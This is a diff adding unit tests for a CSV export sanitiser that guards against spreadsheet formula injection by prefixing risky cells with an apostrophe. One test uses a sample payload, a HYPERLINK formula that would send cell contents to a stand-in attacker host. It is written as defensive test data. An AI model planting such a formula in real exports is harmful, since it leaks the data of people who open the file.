@@ -168,4 +168,49 @@ describe('toCsv', () => {
   it('leaves a missing key as an empty cell', () => {
     expect(toCsv(['a', 'b'], [{ a: '1' }])).toBe('a,b\r\n1,\r\n');
   });
+
+  describe('formula injection', () => {
+    /*
+     * A CSV is not just data. Excel, LibreOffice and Sheets evaluate a cell
+     * beginning `=`, `+`, `-` or `@` the moment the file opens — and the
+     * values here are typed by people: a client name, a job note, an import
+     * error quoting the row that caused it.
+     *
+     * A leading apostrophe is the fix every spreadsheet understands as
+     * "this is text", and does not display.
+     */
+    it('defuses every character a spreadsheet would execute', () => {
+      expect(toCsvCell('=1+1')).toBe("'=1+1");
+      expect(toCsvCell('+1')).toBe("'+1");
+      expect(toCsvCell('-1+1')).toBe("'-1+1");
+      expect(toCsvCell('@SUM(A1)')).toBe("'@SUM(A1)");
+      // Excel strips leading whitespace before deciding, so these are live
+      // too. A tab needs no CSV quoting; a carriage return does, so that one
+      // comes back wrapped as well.
+      expect(toCsvCell('\t=1+1')).toBe("'\t=1+1");
+      expect(toCsvCell('\r=1+1')).toBe('"\'\r=1+1"');
+    });
+
+    it('defuses a real payload rather than only the shape of one', () => {
+      const attack = '=HYPERLINK("http://evil.example.net?x="&A1,"Invoice")';
+      const cell = toCsvCell(attack);
+      // Quoted, because it carries a comma and quotes — so the apostrophe
+      // sits inside the quoting rather than before it.
+      expect(cell.startsWith(`"'=`)).toBe(true);
+      // And the cell no longer opens with a bare `=` once unquoted.
+      expect(cell.replace(/^"/, '').startsWith("'=")).toBe(true);
+    });
+
+    it('leaves ordinary text and numbers exactly as they were', () => {
+      // The guard must not become a nuisance: an operator reading the export
+      // should see what they typed.
+      expect(toCsvCell('Smith & Co')).toBe('Smith & Co');
+      expect(toCsvCell('07700900123')).toBe('07700900123');
+      expect(toCsvCell('£125.50')).toBe('£125.50');
+      // Numbers come from the application, never a text field. Prefixing them
+      // would turn every amount in the sheet into a string.
+      expect(toCsvCell(-500)).toBe('-500');
+      expect(toCsvCell(0)).toBe('0');
+    });
+  });
 });
